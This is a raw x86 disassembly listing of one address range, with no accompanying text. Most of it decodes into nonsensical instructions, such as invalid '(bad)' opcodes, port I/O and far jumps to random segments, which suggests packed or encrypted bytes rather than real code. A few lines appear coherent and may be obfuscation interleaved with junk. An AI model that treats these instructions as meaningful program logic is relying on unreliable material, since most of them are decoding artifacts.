  40a8e2:	sbb    dl,BYTE PTR [eax+edi*1]
  40a8e5:	imul   ecx,ebx,0xa31803e2
  40a8eb:	jnp    0x40a90b
  40a8ed:	mov    ds:0x6f4eba38,al
  40a8f2:	(bad)  
  40a8f3:	ror    BYTE PTR [ebx+0x1ef320d1],1
  40a8f9:	dec    esp
  40a8fa:	mov    ecx,DWORD PTR [edx]
  40a8fc:	sbb    DWORD PTR [eax+0x6e],0x174f004c
  40a903:	jl     0x40a8f4
  40a905:	(bad)  
  40a907:	aam    0x3f
  40a909:	add    bh,0x10
  40a90c:	xor    DWORD PTR [edi+0x70],edx
  40a90f:	sub    esp,DWORD PTR [ebp-0x551efd29]
  40a915:	out    dx,eax
  40a916:	ret    
  40a917:	adc    eax,0x66436efe
  40a91c:	push   edx
  40a91d:	lahf   
  40a91e:	inc    ecx
  40a91f:	out    0xb0,al
  40a921:	adc    BYTE PTR [edi-0x32db09df],cl
  40a927:	xor    dl,BYTE PTR [ebp+0x50ff9f0f]
  40a92d:	mov    bl,0x52
  40a92f:	sub    ah,BYTE PTR [ebp+0x4d32908f]
  40a935:	xor    cl,BYTE PTR [esi+0x2d8af430]
  40a93b:	adc    eax,0xa4df85d9
  40a940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a941:	int3   
  40a942:	cdq    
  40a943:	add    dh,BYTE PTR ds:0x70bdcbd6
  40a949:	or     bh,BYTE PTR ds:0xe33b020b
  40a94f:	jnp    0x40a8fb
  40a951:	popa   
  40a952:	mov    cl,0x9
  40a954:	(bad)  
  40a956:	mov    al,ds:0xa85faec4
  40a95b:	or     bh,ah
  40a95d:	jbe    0x40a9c2
  40a95f:	(bad)  
  40a960:	xor    al,0xa3
  40a962:	out    0x18,eax
  40a964:	and    eax,0xdde07cdd
  40a969:	popa   
  40a96a:	sbb    BYTE PTR [edx],bl
  40a96c:	sub    eax,0x5d9cbe88
  40a971:	jle    0x40a972
  40a973:	in     eax,dx
  40a974:	xor    al,0x1b
  40a976:	fisub  DWORD PTR [esi+0x4a601dfc]
  40a97c:	call   0x352f:0x86748da4
  40a983:	xlat   BYTE PTR ds:[ebx]
  40a984:	and    bh,BYTE PTR [esi]
  40a986:	call   ebp
  40a988:	int    0xfa
  40a98a:	adc    BYTE PTR [edx+0x6021c6c7],bh
  40a990:	rcr    BYTE PTR [edi],cl
  40a992:	repnz push ecx
  40a994:	ins    BYTE PTR es:[edi],dx
  40a995:	xchg   ecx,eax
  40a996:	jp     0x40aa09
  40a998:	adc    ebp,DWORD PTR [esi-0x4]
  40a99b:	mov    esi,0x86c3b819
  40a9a0:	inc    ebp
  40a9a1:	loop   0x40a96c
  40a9a3:	aas    
  40a9a4:	inc    eax
  40a9a5:	push   edi
  40a9a6:	pop    eax
  40a9a7:	jae    0x40a9f4
  40a9a9:	mov    al,ds:0x4a00e18b
  40a9ae:	jo     0x40aa25
  40a9b0:	out    0x38,eax
  40a9b2:	mov    ah,0x1b
  40a9b4:	js     0x40a9d4
  40a9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b7:	arpl   WORD PTR [ebx+0x6d76f9aa],dx
  40a9bd:	pop    ebx
  40a9be:	nop
  40a9bf:	mov    ah,0x6d
  40a9c1:	sbb    ch,BYTE PTR [esi+esi*4-0x21]
  40a9c5:	mov    BYTE PTR [eax],cl
  40a9c7:	mov    ds:0xf8db36e4,al
  40a9cc:	pop    ds
  40a9cd:	ss and ebp,ebp
  40a9d0:	dec    DWORD PTR [esi+0x4b]
  40a9d3:	hlt    
  40a9d4:	lock (bad) 
  40a9d6:	out    0xfa,eax
  40a9d8:	mov    dl,0x56
  40a9da:	push   ss
  40a9db:	inc    ebx
  40a9dc:	sbb    BYTE PTR [ecx],bl
  40a9de:	jno    0x40a991
  40a9e0:	or     DWORD PTR [ebp-0x36301e4],ebp
  40a9e6:	loopne 0x40aa2b
  40a9e8:	cwde   
  40a9e9:	inc    edx
  40a9ea:	jnp    0x40aa03
  40a9ec:	ror    al,cl
  40a9ee:	inc    ebx
  40a9ef:	je     0x40a9bb
  40a9f1:	mov    eax,0xf497476f
  40a9f6:	(bad)  
  40a9f7:	inc    ebx
  40a9f8:	push   ss
  40a9f9:	jmp    0x5371:0x726687ee
  40aa00:	out    0x17,al
  40aa02:	imul   ecx,DWORD PTR [esi],0xffffff94
  40aa05:	pusha  
  40aa06:	pop    ebp
  40aa07:	dec    ecx
  40aa08:	cwde   
  40aa09:	call   0x4deb:0x51e7f3a9
  40aa10:	nop
  40aa11:	pop    ecx
  40aa12:	mov    esp,0x146a03bc
  40aa17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa18:	xor    al,0x17
  40aa1a:	cmp    esp,edi
  40aa1c:	cwde   
  40aa1d:	(bad)  
  40aa1e:	xchg   edi,eax
  40aa1f:	inc    esi
  40aa20:	mov    bl,0x91
  40aa22:	mov    edx,0xa64fd7e
  40aa27:	int3   
  40aa28:	popa   
  40aa29:	jecxz  0x40aa9f
  40aa2b:	outs   dx,BYTE PTR ds:[esi]
  40aa2c:	xor    eax,0x9caa78ba
  40aa31:	adc    eax,0x2dae3152
  40aa36:	(bad)  [ecx-0x1c]
  40aa39:	lock jae 0x40aab3
  40aa3c:	les    edi,FWORD PTR ds:0x884f6f94
  40aa42:	(bad)  
  40aa43:	cmp    al,0xe8
  40aa45:	push   ecx
  40aa46:	in     al,dx
  40aa47:	ret    0xd03e
  40aa4a:	aam    0x9b
  40aa4c:	push   cs
  40aa4d:	out    dx,al
  40aa4e:	mov    bh,0x64
  40aa50:	dec    edx
  40aa51:	and    DWORD PTR [ebx],edx
  40aa53:	adc    al,0xc6
  40aa55:	pop    esi
  40aa56:	adc    eax,0x6dfb1c68
  40aa5b:	xchg   DWORD PTR ds:0x3ed5a392,edi
  40aa61:	call   0x3f9a4305
  40aa66:	push   eax
  40aa67:	jns    0x40aa72
  40aa69:	jno    0x40aaa3
  40aa6b:	or     DWORD PTR [ebp+0x359223bb],ebx
  40aa71:	pop    edx
  40aa72:	add    ecx,ecx
  40aa74:	mov    WORD PTR [ebp+0x2abf510a],ds
  40aa7a:	outs   dx,DWORD PTR ds:[esi]
  40aa7b:	and    ecx,DWORD PTR [ecx+0x6f47a4ac]
  40aa81:	fadd   DWORD PTR [eax-0x2def0a28]
  40aa87:	cmc    
  40aa88:	pop    ss
  40aa89:	adc    DWORD PTR [edi+0xafe03cf],ecx
  40aa8f:	test   BYTE PTR [ebx],dh
  40aa91:	sar    DWORD PTR [edx+0x3272db],0x3
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xd0bcebbc
  40aacc:	sti    
  40aacd:	push   esp
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx-0x39]
  40aad6:	pop    eax
  40aad7:	aas    
  40aad8:	aad    0xe3
  40aada:	jle    0x40aaed
  40aadc:	and    BYTE PTR [esi-0x72841739],dl
  40aae2:	push   cs
  40aae3:	out    dx,eax
  40aae4:	aad    0xf9
  40aae6:	fwait
  40aae7:	sbb    eax,DWORD PTR [ecx+ebp*2]
  40aaea:	bound  esp,QWORD PTR ds:0x270f8324
  40aaf0:	cmc    
  40aaf1:	xchg   edi,eax
  40aaf2:	jno    0x40ab1c
  40aaf4:	das    
  40aaf5:	jo     0x40aaef
  40aaf7:	jge    0x40ab04
  40aaf9:	push   ecx
  40aafa:	cmp    eax,0xd69f723e
  40aaff:	jne    0x40aad9
  40ab01:	shl    BYTE PTR [eax+0xd],cl
  40ab04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab05:	imul   eax,DWORD PTR [edx+0x11],0xb554d19a
  40ab0c:	out    0x4b,eax
  40ab0e:	inc    eax
  40ab0f:	add    dh,BYTE PTR [ebx]
  40ab11:	hlt    
  40ab12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab13:	mov    cl,0xd6
  40ab15:	retf   0xe444
  40ab18:	or     al,0xf8
  40ab1a:	lock daa 
  40ab1c:	add    BYTE PTR [esi-0x739577de],bh
  40ab22:	jl     0x40aad5
  40ab24:	popa   
  40ab25:	popa   
  40ab26:	or     DWORD PTR [edx+eax*8+0x41],edx
  40ab2a:	retf   0x17b9
  40ab2d:	int3   
  40ab2e:	jle    0xc5cd45e3
  40ab34:	mov    ebp,0xdc7fd12f
  40ab39:	aas    
  40ab3a:	jo     0x40aaea
  40ab3c:	in     eax,0x56
  40ab3e:	pushf  
  40ab3f:	and    DWORD PTR ds:0xea239318,ebp
  40ab45:	ficom  DWORD PTR [edi-0x26de034]
  40ab4b:	jmp    0xd1397ea2
  40ab50:	daa    
  40ab51:	push   es
  40ab52:	cld    
  40ab53:	jmp    0xa8992b18
  40ab58:	cmp    al,BYTE PTR [edx-0x36]
  40ab5b:	pushf  
  40ab5c:	add    eax,0x22e96a5b
  40ab61:	lds    edi,FWORD PTR [esi+ecx*2-0x18]
  40ab65:	loopne 0x40aaf0
  40ab67:	dec    edx
  40ab68:	push   esp
  40ab69:	xor    ebx,esp
  40ab6b:	ficom  WORD PTR [eax+0x7e]
  40ab6e:	jae    0x40aafc
  40ab70:	(bad)  
  40ab71:	icebp  
  40ab72:	mov    ecx,0xd35fab88
  40ab77:	nop
  40ab78:	in     al,dx
  40ab79:	mov    ds:0x9536f916,eax
  40ab7e:	lea    edi,[ebp+0x34eef38f]
  40ab84:	add    BYTE PTR [ebp+0x2a0c77d9],al
  40ab8a:	fwait
  40ab8b:	mov    ebx,0xbfd1906a
  40ab90:	cmp    eax,0xc8831f4d
  40ab95:	pop    edi
  40ab96:	pop    es
  40ab97:	rcr    BYTE PTR [esi+0x7d],0xa8
  40ab9b:	ror    esp,cl
  40ab9d:	pop    es
  40ab9e:	or     al,0xff
  40aba0:	inc    esi
  40aba1:	aad    0x38
  40aba3:	lods   al,BYTE PTR ds:[esi]
  40aba4:	mov    ah,0x68
  40aba6:	jne    0x40ab67
  40aba8:	loopne 0x40ac1e
  40abaa:	mov    dl,0xc7
  40abac:	retf   0xd910
  40abaf:	cli    
  40abb0:	mov    cl,0x57
  40abb2:	jns    0x40abad
  40abb4:	inc    eax
  40abb5:	sar    ebx,0x8d
  40abb8:	sbb    DWORD PTR [edi-0x39],esi
  40abbb:	fcom   DWORD PTR [ebx+0x7b]
  40abbe:	test   eax,0x96c3034c
  40abc3:	je     0x40abd2
  40abc5:	push   edx
  40abc6:	and    edi,DWORD PTR [ecx]
  40abc8:	fs cwde 
  40abca:	add    DWORD PTR [ecx-0x3],edi
  40abcd:	sbb    DWORD PTR ds:[eax],edx
  40abd0:	push   0x64
  40abd2:	cmp    dh,ah
  40abd4:	inc    ebp
  40abd5:	nop
  40abd6:	outs   dx,BYTE PTR ds:[esi]
  40abd7:	nop
  40abd8:	inc    ecx
  40abd9:	sbb    ah,BYTE PTR [ebx+0x3]
  40abdc:	gs stc 
  40abde:	fsubp  st(4),st
  40abe0:	xchg   BYTE PTR [esi],ah
  40abe2:	lds    edx,FWORD PTR [eax]
  40abe4:	push   ebx
  40abe5:	add    BYTE PTR [ecx-0x1f3b5282],ch
  40abeb:	aaa    
  40abec:	fs dec ebx
  40abee:	push   edi
  40abef:	popa   
  40abf0:	(bad)  
  40abf1:	sbb    al,0xdd
  40abf3:	loope  0x40abfa
  40abf5:	lahf   
  40abf6:	mov    bh,0xdd
  40abf8:	and    ebx,edx
  40abfa:	xchg   esi,eax
  40abfb:	nop
  40abfc:	mov    ebp,0x2f1853af
  40ac01:	mov    eax,0xf6824a6a
  40ac06:	xchg   ebx,eax
  40ac07:	and    edi,DWORD PTR [edi]
  40ac09:	stc    
  40ac0a:	cld    
  40ac0b:	jne    0x40abd0
  40ac0d:	cmp    al,0xa1
  40ac0f:	inc    edi
  40ac10:	in     al,dx
  40ac11:	lock push ds
  40ac13:	xchg   esi,eax
  40ac14:	inc    edi
  40ac15:	mov    ebp,0x85018ee7
  40ac1a:	int    0x98
  40ac1c:	nop
  40ac1d:	lahf   
  40ac1e:	test   al,0x1a
  40ac20:	aad    0xd4
  40ac22:	repnz scas al,BYTE PTR es:[edi]
  40ac24:	adc    al,BYTE PTR [ecx-0x5d]
  40ac27:	shl    BYTE PTR [esi+0x4e0e65e1],cl
  40ac2d:	les    eax,FWORD PTR [esi-0x69]
  40ac30:	dec    edi
  40ac31:	mov    ds:0x1f2021fe,al
  40ac36:	adc    eax,0x4f8d4c74
  40ac3b:	(bad)  
  40ac3c:	jmp    0x40abbf
  40ac3e:	stc    
  40ac3f:	jg     0x40ac77
  40ac41:	xor    BYTE PTR [eax],dl
  40ac43:	mov    cl,0x7e
  40ac45:	sbb    ebp,edx
  40ac47:	pop    esp
  40ac48:	jge    0x40ac7c
  40ac4a:	repnz fisttp DWORD PTR [esi-0x51]
  40ac4e:	stc    
  40ac4f:	popf   
  40ac50:	jl     0x40acd1
  40ac52:	xchg   DWORD PTR [eax+0x2c],ebx
  40ac55:	aam    0x8d
  40ac57:	mov    WORD PTR ds:0x77f389a2,cs
  40ac5d:	mov    esp,DWORD PTR [ebp+0x74d7502c]
  40ac63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac64:	mov    ecx,0x2bc15f6d
  40ac69:	js     0x40abf8
  40ac6b:	int3   
  40ac6c:	rol    dh,cl
  40ac6e:	cmc    
  40ac6f:	enter  0x38c2,0x35
  40ac73:	nop
  40ac74:	mov    dh,0x92
  40ac76:	push   esp
  40ac77:	into   
  40ac78:	mov    esp,0xea3acf3a
  40ac7d:	xor    BYTE PTR [ebx-0x3a],ah
  40ac80:	push   eax
  40ac81:	enter  0xcd20,0x80
  40ac85:	adc    al,0x46
  40ac87:	push   edi
  40ac88:	sbb    al,0x13
  40ac8a:	jmp    0x147a334f
  40ac8f:	sbb    al,0x75
  40ac91:	sti    
  40ac92:	leave  
  40ac93:	push   ss
  40ac94:	out    dx,al
  40ac95:	cmp    BYTE PTR [edi],cl
  40ac97:	inc    esp
  40ac98:	add    al,0x9f
  40ac9a:	mov    esi,0x357675f7
  40ac9f:	maxps  xmm4,XMMWORD PTR [ebx-0x12]
  40aca3:	jno    0x40ac26
  40aca5:	leave  
  40aca6:	rcl    BYTE PTR [eax],1
  40aca8:	lods   eax,DWORD PTR ds:[esi]
  40aca9:	lahf   
  40acaa:	push   edi
  40acab:	xor    BYTE PTR [edi+eax*2+0x71],0xf
  40acb0:	adc    eax,DWORD PTR [ebx+0x5624e0fa]
  40acb6:	aaa    
  40acb7:	and    al,0xea
  40acb9:	jbe    0x40ac48
  40acbb:	or     DWORD PTR [esi],edi
  40acbd:	pop    ecx
  40acbe:	and    BYTE PTR [ebp+0x5c],al
  40acc1:	cs and al,0xf7
  40acc4:	inc    esi
  40acc5:	inc    edx
  40acc6:	mov    WORD PTR [eax],cs
  40acc8:	add    BYTE PTR [esi-0xf],ah
  40accb:	lods   eax,DWORD PTR ds:[esi]
  40accc:	lds    edi,FWORD PTR [eax+eax*1-0x54]
  40acd0:	sbb    esi,DWORD PTR [ecx-0x6355b23a]
  40acd6:	outs   dx,BYTE PTR ds:[esi]
  40acd7:	and    ah,BYTE PTR [eax+0x71]
  40acda:	mov    dl,0xf2
  40acdc:	jne    0x40acf2
  40acde:	xor    esi,DWORD PTR [eax]
  40ace0:	bound  eax,QWORD PTR [esp+edx*4+0x6f39e934]
  40ace7:	dec    ecx
  40ace8:	add    eax,0x335a71b0
  40aced:	out    dx,eax
  40acee:	ss aad 0xb0
  40acf1:	push   esi
  40acf2:	mov    edx,0x3ce9dcf3
  40acf7:	rol    BYTE PTR [eax+0x46155b60],0xb
  40acfe:	xor    ah,BYTE PTR [esi-0x38]
  40ad01:	jb     0x40ad1f
  40ad03:	xchg   esp,eax
  40ad04:	gs inc esp
  40ad06:	or     ebx,DWORD PTR [edx]
  40ad08:	stos   BYTE PTR es:[edi],al
  40ad09:	ins    BYTE PTR es:[edi],dx
  40ad0a:	xor    DWORD PTR [eax+ebp*8-0x5a],0xffffffad
  40ad0f:	mov    ah,0x58
  40ad11:	mov    BYTE PTR [ebx],ah
  40ad13:	sub    al,0xfc
  40ad15:	xchg   BYTE PTR [ebx-0x19],bl
  40ad18:	ins    DWORD PTR es:[edi],dx
  40ad19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad1a:	or     eax,0x2ad74f83
  40ad1f:	sub    al,0x3f
  40ad21:	inc    esp
  40ad22:	outs   dx,DWORD PTR ds:[esi]
  40ad23:	push   ss
  40ad24:	fcomip st,st(7)
  40ad26:	ror    BYTE PTR [eax],0x51
  40ad29:	jbe    0x40ad09
  40ad2b:	cmp    eax,0xab0d92d1
  40ad30:	jno    0x40ace3
  40ad32:	sub    ecx,esp
  40ad34:	lods   eax,DWORD PTR ds:[esi]
  40ad35:	(bad)  
  40ad36:	add    BYTE PTR [eax+edi*1+0x7060b4bf],al
  40ad3d:	int    0xbf
  40ad3f:	dec    ebx
  40ad40:	jle    0x40ad15
  40ad42:	dec    eax
  40ad43:	adc    al,0xf7
  40ad45:	jae    0x40ad7a
  40ad47:	dec    ecx
  40ad48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad49:	bound  ebp,QWORD PTR [edx-0x79]
  40ad4c:	ss sub eax,0xc2016ce4
  40ad52:	dec    edi
  40ad53:	test   al,0xa6
  40ad55:	push   0x3ddea2d9
  40ad5a:	(bad)  
  40ad5b:	in     eax,dx
  40ad5c:	test   DWORD PTR [esi-0x40],ebp
  40ad5f:	fdiv   DWORD PTR [ebx+0x268b8861]
  40ad65:	push   DWORD PTR gs:[esi-0x4355397a]
  40ad6c:	jmp    0x9907:0x63cfcb4b
  40ad73:	fld    DWORD PTR [eax]
  40ad75:	rol    DWORD PTR [edi],1
  40ad77:	dec    eax
  40ad79:	or     dh,BYTE PTR [ebx+0x5]
  40ad7c:	popa   
  40ad7d:	inc    edx
  40ad7e:	mov    ch,0x2f
  40ad80:	dec    ecx
  40ad81:	mov    al,ds:0x19ad0b15
  40ad86:	mov    ecx,ecx
  40ad88:	lods   eax,DWORD PTR ds:[esi]
  40ad89:	mov    WORD PTR [ecx+0x1adcf79d],?
  40ad8f:	stc    
  40ad90:	aaa    
  40ad91:	test   BYTE PTR [edx],dl
  40ad93:	dec    edi
  40ad94:	pop    ss
  40ad95:	pop    ebx
  40ad96:	xor    bl,dh
  40ad98:	sar    BYTE PTR [ebp-0xdea7780],0x35
  40ad9f:	test   BYTE PTR [eax-0x20],bh
  40ada2:	xchg   ebp,eax
  40ada3:	mov    ecx,ebp
  40ada5:	lock jge 0x40ad8a
  40ada8:	out    dx,eax
  40ada9:	mov    al,0xa4
  40adab:	ret    
  40adac:	dec    ebx
  40adad:	sbb    dh,BYTE PTR [ebp+0x3e]
  40adb0:	jne    0x40ae22
  40adb2:	dec    ebp
  40adb3:	mov    cl,0x3d
  40adb5:	sub    eax,0x5c6a96d0
  40adba:	dec    ecx
  40adbb:	cmp    ebp,ebp
  40adbd:	in     al,0xca
  40adbf:	jl     0x40ad81
  40adc1:	xchg   si,ax
  40adc3:	add    al,BYTE PTR es:[edx+edx*4]
  40adc7:	out    dx,al
  40adc8:	and    dl,al
  40adca:	cwde   
  40adcb:	arpl   WORD PTR [edx+0x64],bp
  40adce:	leave  
  40adcf:	jle    0x40ad78
  40add1:	cld    
  40add2:	add    ah,BYTE PTR [ebx-0x623b2578]
  40add8:	std    
  40add9:	push   ds
  40adda:	mov    edx,DWORD PTR [edi]
  40addc:	adc    al,0x98
  40adde:	push   ebx
  40addf:	(bad)  
  40ade0:	jbe    0x40ad63
  40ade2:	or     DWORD PTR [ecx+0x51],edx
  40ade5:	push   cs
  40ade6:	push   0xffffffe8
  40ade8:	jp     0x40adb3
  40adea:	imul   edi,DWORD PTR [ebp-0x715fcc7e],0x6ba3357a
  40adf4:	xchg   ebx,eax
  40adf5:	nop
  40adf6:	ret    0xe87b
  40adf9:	mov    ch,0xcf
  40adfb:	and    eax,0x57020f9e
  40ae00:	hlt    
  40ae01:	or     BYTE PTR [eax],dl
  40ae03:	xor    BYTE PTR [ecx],0xf2
  40ae06:	mov    al,ds:0xd1023d84
  40ae0b:	mov    ah,0x16
  40ae0d:	add    BYTE PTR ds:0xac6eb8cd,bl
  40ae13:	push   eax
  40ae14:	or     cl,BYTE PTR [eax+0x11c9f075]
  40ae1a:	cli    
  40ae1b:	push   0xffffff88
  40ae1d:	push   ss
  40ae1e:	xchg   edx,eax
  40ae1f:	sbb    BYTE PTR [edi],0x48
  40ae22:	push   eax
  40ae23:	mov    esp,0xafb0eb59
  40ae28:	dec    esi
  40ae29:	fild   DWORD PTR [eax]
  40ae2b:	inc    DWORD PTR [esi+0x67290730]
  40ae31:	sahf   
  40ae32:	dec    eax
  40ae33:	xchg   ebx,eax
  40ae34:	xchg   esi,eax
  40ae35:	jmp    DWORD PTR [edi-0x5027c61]
  40ae3b:	mov    ebp,0x17fc75f6
  40ae40:	daa    
  40ae41:	add    DWORD PTR [ebp+0x5d56bc5f],0x76
  40ae48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae49:	jge    0x40ae64
  40ae4b:	jno    0x40ae37
  40ae4d:	dec    edx
  40ae4e:	sbb    BYTE PTR [esi-0x4f],cl
  40ae51:	jns    0x40ade8
  40ae53:	sbb    ah,BYTE PTR [ebx+0x20]
  40ae56:	loopne 0x40adfb
  40ae58:	sbb    al,0xf9
  40ae5a:	pop    ds
  40ae5b:	fld    DWORD PTR ds:0xf0001c21
  40ae61:	lahf   
  40ae62:	daa    
  40ae63:	sub    BYTE PTR [ecx],0x85
  40ae66:	in     al,0xd4
  40ae68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae69:	xchg   esp,eax
  40ae6a:	mov    bl,0x1e
  40ae6c:	and    edx,DWORD PTR [ebx+0xd1d0ef2]
  40ae72:	call   0x8987222a
  40ae77:	pop    ds
  40ae78:	je     0x40ae87
  40ae7a:	add    eax,0x65734015
  40ae7f:	cmp    eax,0xdbe6dc51
  40ae84:	xor    eax,0xc4388a76
  40ae89:	push   es
  40ae8a:	inc    eax
  40ae8b:	jge    0x40aea7
  40ae8d:	ret    0x8ab7
  40ae90:	ficomp WORD PTR [ebx+0x33df7a61]
  40ae96:	and    BYTE PTR [eax+edi*2],0x69
  40ae9a:	lea    ebx,[eax]
  40ae9c:	gs out 0x86,al
  40ae9f:	int3   
  40aea0:	adc    ecx,esp
  40aea2:	mov    cl,0x6e
  40aea4:	ins    DWORD PTR es:[edi],dx
  40aea5:	mov    bh,0x27
  40aea7:	push   ecx
  40aea8:	or     al,0xc0
  40aeaa:	dec    edx
  40aeab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeac:	sub    ebp,DWORD PTR [ecx]
  40aeae:	retf   
  40aeaf:	fld    st(0)
  40aeb1:	scas   al,BYTE PTR es:[edi]
  40aeb2:	stos   BYTE PTR es:[edi],al
  40aeb3:	mov    ebp,0xf71590cc
  40aeb8:	mov    bl,BYTE PTR [esi-0x55f35b09]
  40aebe:	scas   al,BYTE PTR es:[edi]
  40aebf:	mov    esi,0x3a10930c
  40aec4:	cmp    edx,0x3478ac47
  40aeca:	addr16 mov al,ds:0xda1
  40aece:	adc    BYTE PTR [edx-0x56],dh
  40aed1:	adc    al,al
  40aed3:	xor    ebp,eax
  40aed5:	add    al,0xc7
  40aed7:	repz mov edx,0xc4be6087
  40aedd:	call   0x9c92:0x65483634
  40aee4:	mov    ss,WORD PTR [edx]
  40aee6:	cdq    
  40aee7:	in     eax,dx
  40aee8:	and    eax,0xf42d7cf2
  40aeed:	in     eax,dx
  40aeee:	pusha  
  40aeef:	sub    al,0xcc
  40aef1:	popa   
  40aef2:	xchg   edi,eax
  40aef3:	loop   0x40aea7
  40aef5:	in     eax,dx
  40aef6:	jb     0x40aed4
  40aef8:	stos   BYTE PTR es:[edi],al
  40aef9:	dec    ecx
  40aefa:	dec    ecx
  40aefb:	add    esp,DWORD PTR [ecx+0x4d14254b]
  40af01:	aam    0x67
  40af03:	clc    
  40af04:	mov    sp,?
  40af07:	frstor [eax]
  40af09:	xor    eax,0x97276480
  40af0e:	lea    eax,[ecx-0x1c]
  40af11:	dec    edi
  40af12:	jno    0x40af6c
  40af14:	(bad)  [esi-0x3dc6fc93]
  40af1a:	sub    dh,BYTE PTR [edi-0x6003ca10]
  40af20:	fsub   DWORD PTR [esi+0x43]
  40af23:	inc    esi
  40af24:	jg     0x40aeef
  40af26:	cmp    eax,0xb6b471f7
  40af2b:	pop    ecx
  40af2c:	mov    ah,0x21
  40af2e:	scas   al,BYTE PTR es:[edi]
  40af2f:	sbb    BYTE PTR [eax-0x6],cl
  40af32:	cmp    BYTE PTR [ecx-0x403c1909],ah
  40af38:	pop    edx
  40af39:	in     eax,0xb
  40af3b:	js     0x40af4f
  40af3d:	or     DWORD PTR [ebx+0x4c],ebp
  40af40:	neg    BYTE PTR [edi]
  40af42:	push   es
  40af43:	ja     0x40af4f
  40af45:	es arpl cx,dx
  40af48:	xchg   ebp,eax
  40af49:	and    BYTE PTR [eax+0x5aa14f57],dh
  40af4f:	jp     0x40aef8
  40af51:	scas   al,BYTE PTR es:[edi]
  40af52:	and    DWORD PTR [ecx+0x6c771e0e],ebp
  40af58:	mov    cl,dh
  40af5a:	inc    edx
  40af5b:	stos   DWORD PTR es:[edi],eax
  40af5c:	add    ebp,DWORD PTR [esi+0x21]
  40af5f:	rcl    BYTE PTR [ebx*2+0x47da830e],cl
  40af66:	sbb    DWORD PTR [edx-0x6068e620],eax
  40af6c:	stos   BYTE PTR es:[edi],al
  40af6d:	push   0x7bd49c17
  40af72:	cmp    BYTE PTR [ebp+0x46],cl
  40af75:	adc    esi,ebp
  40af77:	in     eax,0x2e
  40af79:	jbe    0x40af82
  40af7b:	mov    esp,0x7c2171f4
  40af80:	adc    DWORD PTR [edi-0x6e],ebx
  40af83:	pusha  
  40af84:	add    BYTE PTR [eax-0x20],dl
  40af87:	dec    edx
  40af88:	sub    eax,esp
  40af8a:	pop    gs
  40af8c:	mov    ah,0x4a
  40af8e:	arpl   WORD PTR [eax+ebp*1],si
  40af91:	mov    ebx,0xdcd677d1
  40af96:	test   al,0x2d
  40af98:	retf   
  40af99:	scas   al,BYTE PTR es:[edi]
  40af9a:	add    DWORD PTR [ecx+edx*4+0x3],esp
  40af9e:	or     bl,0x40
  40afa1:	stos   DWORD PTR es:[edi],eax
  40afa2:	in     al,dx
  40afa3:	(bad)  
  40afa4:	add    DWORD PTR [eax-0x6f103393],edx
  40afaa:	mov    bh,0xa
  40afac:	jmp    0x40afa6
  40afae:	xchg   ebp,eax
  40afaf:	push   es
  40afb0:	aam    0x17
  40afb2:	pop    esp
  40afb3:	daa    
  40afb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afb5:	(bad)  [esi]
  40afb7:	popa   
  40afb8:	(bad)  
  40afba:	inc    ecx
  40afbb:	xor    BYTE PTR [eax],bh
  40afbd:	jl     0x40af81
  40afbf:	and    BYTE PTR [ecx-0x23],al
  40afc2:	sbb    DWORD PTR [ebp-0x4a996e85],ecx
  40afc8:	mov    cl,0xd
  40afca:	sub    al,0x1a
  40afcc:	inc    esp
  40afcd:	xchg   edi,eax
  40afce:	sti    
  40afcf:	(bad)  
  40afd0:	dec    ebp
  40afd1:	ins    DWORD PTR es:[edi],dx
  40afd2:	out    0x98,eax
  40afd4:	pop    edx
  40afd5:	pop    eax
  40afd6:	ja     0x40b001
  40afd8:	adc    al,0xce
  40afda:	pop    ebp
  40afdb:	xor    eax,0x5141075e
  40afe0:	pushf  
  40afe1:	(bad)  [edi]
  40afe3:	cwde   
  40afe4:	fxch   st(7)
  40afe6:	or     al,0xd2
  40afe8:	push   ss
  40afe9:	(bad)  
  40afea:	lods   al,BYTE PTR ds:[esi]
  40afeb:	imul   ebx,DWORD PTR [edx],0xffffff87
  40afee:	dec    ebx
  40afef:	or     DWORD PTR [esi],0x2a0b981a
  40aff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aff6:	xor    edi,DWORD PTR [edi]
  40aff8:	or     ebp,DWORD PTR [esi]
  40affa:	sbb    al,0x6b
  40affc:	or     ah,BYTE PTR [esi-0xe347e96]
  40b002:	mov    ?,WORD PTR [edi-0x67]
  40b005:	test   eax,0x5bda6d48
  40b00a:	(bad)  
  40b00b:	or     dh,BYTE PTR [esp+edx*4]
  40b00e:	rcl    BYTE PTR [ecx+ebx*8],0x8
  40b012:	stos   BYTE PTR es:[edi],al
  40b013:	jno    0x40b04d
  40b015:	and    esp,edx
  40b017:	enter  0xc91f,0x99
  40b01b:	aam    0x8b
  40b01d:	sahf   
  40b01e:	pop    ecx
  40b01f:	bound  ebp,QWORD PTR [edi]
  40b021:	cmp    al,0x25
  40b023:	push   ecx
  40b024:	pushw  ds
  40b026:	sbb    esi,DWORD PTR [edx-0x6acdb44d]
  40b02c:	pop    edx
